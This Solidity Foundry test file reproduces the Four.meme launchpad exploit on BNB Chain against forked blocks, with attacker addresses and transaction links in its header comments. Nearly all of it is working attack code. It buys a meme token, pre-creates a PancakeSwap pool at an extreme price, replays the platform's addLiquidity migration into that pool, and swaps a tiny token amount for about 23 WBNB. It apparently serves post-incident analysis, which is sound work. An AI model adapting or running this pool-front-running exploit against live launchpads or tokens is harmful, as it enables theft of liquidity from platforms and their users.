// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20, WETH} from "../interface.sol";

// @KeyInfo - Total Lost : 186k (287bnb)
// Attacker 1: https://bscscan.com/address/0x010Fc97CB0a4D101dCe20DAB37361514bD59A53A
// Attacker 2: https://bscscan.com/address/0x935d6cf073eab37ca2b5878af21329d5dbf4f4a5
// Attacker 3: https://bscscan.com/address/0xf91848a076efaa6b8ecc9d378ab6d32bd506dc79
// Attacker 4: https://bscscan.com/address/0x907004b6bb6965a83fdbcbc060a5b30bc876c33d
// Attacker 5: https://bscscan.com/address/0x482b004e7800174a1efb87f496552ac8f53b2fda

// Attack Contract 1 (Swap and take profit): https://bscscan.com/address/0x06799F7b09A455c1cF6a8E7615Ece04B31A9D051
// Attack Contract 2 (Hacker buy meme token): https://bscscan.com/address/0x4fdebca823b7886c3a69fa5fc014104f646d9591
// Attack Contract 3 (Hacker create pool): https://bscscan.com/address/0xbf26e147918a07cb8d8cf38d260edf346977686c
// Vulnerable Contract (Four meme launchpad): https://bscscan.com/address/0x5c952063c7fc8610FFDB798152D69F0B9550762b

// Pre Attack Tx (Buy meme token): https://bscscan.com/tx/0xdb5d43317ab8e5d67cdd5006b30a6f2ced513237ac189eb1e57f0f06f630d582
// Pre Attack Tx (Hacker create pool): https://bscscan.com/tx/0x4235b006b94a79219181623a173a8a6aadacabd01d6619146ffd6fbcbb206dff
// Pre Attack Tx (Four meme add liquidity): https://bscscan.com/tx/0xe0daa3bf68c1a714f255294bd829ae800a381624417ed4b474b415b9d2efeeb5
// Attack Tx (Swap and take profit): https://bscscan.com/tx/0x2902f93a0e0e32893b6d5c907ee7bb5dabc459093efa6dbc6e6ba49f85c27f61

// @Info
// Vulnerable Contract Code : Four meme launchpad code isn't open source
// Notice that nearly 20 meme tokens are exploited by the hacker in the same way
// I only demonstrate the attack on snowboard token

// @Analysis
// Check chaincatcher analysis first
// Post-mortem : https://securrtech.medium.com/the-four-meme-exploit-a-deep-dive-into-the-183-000-hack-6f45369029be
// Twitter Guy : https://x.com/four_meme_/status/1889198796695044138
// Hacking God : https://x.com/PeckShieldAlert/status/1889210001220423765

interface IFourMeme {
    function addLiquidity(address, uint160) external;
    function buyTokenAMAP(address token, uint256 amount, uint256 unknown) external payable;
}

interface IPancakeRouter {
    function createAndInitializePoolIfNecessary(
        address tokenA,
        address tokenB,
        uint24 fee,
        uint160 sqrtPriceX96
    ) external payable returns (address pool);
}

interface IPancakePool {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

contract FourMeme is BaseTestWithBalanceLog {
    address public fourMemeOwner = 0x74d86638f359bDfF6EC55d78A97F294747f8f5B3;
    address public fourMeme = 0x5c952063c7fc8610FFDB798152D69F0B9550762b;
    address public memeToken = 0x4AbfD9a204344bd81A276C075ef89412C9FD2f64; // snowboard
    address public wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public pancakeRouter = 0x46A15B0b27311cedF172AB29E4f4766fbE7F4364;
    address public pancakePool = 0xa610cC0d657bbFe78c9D1eA638147984B2F3C05c;
    address public attackerBuyContract = 0x4FdEBcA823b7886c3A69fA5fC014104F646D9591;

    string constant RPC_URL = "bsc"; // You may need to change "bsc" to your own rpc url

    uint256 public bscBuyFork = vm.createFork(RPC_URL, 46_555_711);
    uint256 public bscHackerCreatePoolFork = vm.createFork(RPC_URL, 46_555_725);
    uint256 public bscCreatePoolFork = vm.createFork(RPC_URL, 46_555_731 - 1);
    uint256 public bscSwapFork = vm.createFork(RPC_URL, 46_555_732 - 1);

    BuyMemeFromFourMeme public buyMemeFromFourMeme;
    HackerPool public hackerPool;
    Swap public swap;

    function setUp() public {
        vm.label(address(fourMemeOwner), "fourMemeOwner");
        vm.label(address(fourMeme), "fourMeme");
        vm.label(address(memeToken), "memeToken");
        vm.label(address(wbnb), "wbnb");
        vm.label(address(pancakeRouter), "pancakeRouter");
        vm.label(address(pancakePool), "pancakePool");
        vm.label(address(attackerBuyContract), "attackerBuyContract");

        fundingToken = address(0);
    }

    function testExploit() public balanceLog {
        // Preparation
        buyMemeToken(); // User can only get meme token from four.meme platform during this stage
        HackerCreatePool(); // Hacker create a pool with extremely high sqrtPriceX96
        CreatePool(); // When the market capitalization of the memecoin reaches 24 BNB, four.meme migrates the liquidity to pancakeswap

        // Make profit
        SwapToken(); // Use 1603 snowboard token(worth 0.0001 bnb) to swap 23.426 wbnb
    }

    // Buy meme token from four.meme
    function buyMemeToken() public {
        vm.selectFork(bscBuyFork);
        buyMemeFromFourMeme = new BuyMemeFromFourMeme(fourMeme, memeToken);
        vm.deal(address(this), 0.0001 ether); // Use 0.0001 bnb to buy meme
        buyMemeFromFourMeme.buyToken{value: 0.0001 ether}(); // Buy 1_603.243_002_223_000_000_000 snowboard
    }

    // Create a pool on pancakeswap by hacker
    function HackerCreatePool() public {
        vm.selectFork(bscHackerCreatePoolFork);
        hackerPool = new HackerPool(pancakeRouter, fourMeme, memeToken, wbnb);
        address pool = hackerPool.createPool(); // 0xa610cC0d657bbFe78c9D1eA638147984B2F3C05c
    }

    // It should create a pool on pancakeswap by four.meme platform
    // But instead it added liquidity to the pool created by hacker
    // This is because hacker already created a pool on pancakeswap
    // The restriction on transfer is also removed in addLiquidity function
    function CreatePool() public {
        vm.selectFork(bscCreatePoolFork);
        // Only four.meme owner can call addLiquidity
        // So this function is called by four.meme platform
        vm.startPrank(fourMemeOwner, fourMemeOwner);
        uint160 sqrtPriceX96 = uint160(27_169_599_998_237_907_265_358_521);
        IFourMeme(fourMeme).addLiquidity(memeToken, sqrtPriceX96);
        vm.stopPrank();
    }

    // Swap snowboard token to wbnb
    function SwapToken() public {
        vm.selectFork(bscSwapFork);
        swap = new Swap(pancakePool, fourMeme, memeToken, wbnb);
        // Transfer snowboard token to attacker contract
        // attackerBuyContract is the real buyMemeFromFourMeme contract used by hacker
        // Because the trading function within four.meme is not allowed in this block
        // So I can only transfer snowboard token from attackerBuyContract
        uint256 balance = IERC20(memeToken).balanceOf(attackerBuyContract);
        vm.prank(attackerBuyContract);
        IERC20(memeToken).transfer(address(swap), balance);

        int256 amountSpecified = int256(IERC20(memeToken).balanceOf(address(swap))); // 1_603.243_002_223_000_000_000
        uint160 sqrtPriceLimitX96 = 4_295_128_740;
        // Use 1603 snowboard token(worth 0.0001 bnb) to swap 23.426 wbnb
        int256 wbnbAmount = swap.swap(amountSpecified, sqrtPriceLimitX96);
        swap.withdraw();
        WETH(wbnb).withdraw(uint256(-wbnbAmount));
    }

    fallback() external payable {}

    receive() external payable {}
}

contract BuyMemeFromFourMeme {
    // During this stage, user can only buy meme token from four.meme platform
    // Neither OTC nor pancakeswap is allowed
    address public fourMeme;
    address public memeToken;

    constructor(address _fourMeme, address _memeToken) {
        fourMeme = _fourMeme;
        memeToken = _memeToken;
    }

    function buyToken() public payable {
        IFourMeme(fourMeme).buyTokenAMAP{value: msg.value}(memeToken, 100_000_000_000_000, 0);
    }

    fallback() external payable {}

    receive() external payable {}
}

contract HackerPool {
    address public pancakeRouter;
    address public fourMeme;
    address public memeToken;
    address public wbnb;

    constructor(address _pancakeRouter, address _fourMeme, address _memeToken, address _wbnb) {
        pancakeRouter = _pancakeRouter;
        fourMeme = _fourMeme;
        memeToken = _memeToken;
        wbnb = _wbnb;
    }

    // Create a pool on pancakeswap by hacker
    function createPool() public returns (address) {
        // Ask for pancakeswap fee
        (bool success, bytes memory data) = address(fourMeme).call(
            abi.encodeWithSelector(0x9f266331, address(memeToken))
        );
        (, uint24 pancakeFee, ) = abi.decode(data, (uint256, uint24, uint256));

        uint160 sqrtPriceX96 = uint160(10_000_000_000_000_000_000_000_000_000_000_000_000_000); // 368_058_418_256_012 times larger than the normal value

        address pool = IPancakeRouter(pancakeRouter).createAndInitializePoolIfNecessary(
            memeToken,
            wbnb,
            pancakeFee,
            sqrtPriceX96
        );
        return pool;
    }
}

contract Swap {
    address public pancakePool;
    address public fourMeme;
    address public memeToken;
    address public wbnb;
    address public owner;

    constructor(address _pancakePool, address _fourMeme, address _memeToken, address _wbnb) {
        pancakePool = _pancakePool;
        fourMeme = _fourMeme;
        memeToken = _memeToken;
        wbnb = _wbnb;
        owner = msg.sender;
    }

    // Call the swap function of pancakeswap pool (snowboard -> wbnb)
    function swap(int256 amountSpecified, uint160 sqrtPriceLimitX96) public returns (int256) {
        (int256 memeTokenAmount, int256 wbnbAmount) = IPancakePool(pancakePool).swap(
            address(this),
            true,
            amountSpecified,
            sqrtPriceLimitX96,
            ""
        );
        return wbnbAmount;
    }

    // This function is called by pancakeswap pool
    // It is used to transfer snowboard token to pancakeswap pool
    function pancakeV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        IERC20(memeToken).transfer(pancakePool, uint256(amount0Delta));
    }

    function withdraw() external {
        IERC20(wbnb).transfer(owner, IERC20(wbnb).balanceOf(address(this)));
    }
}
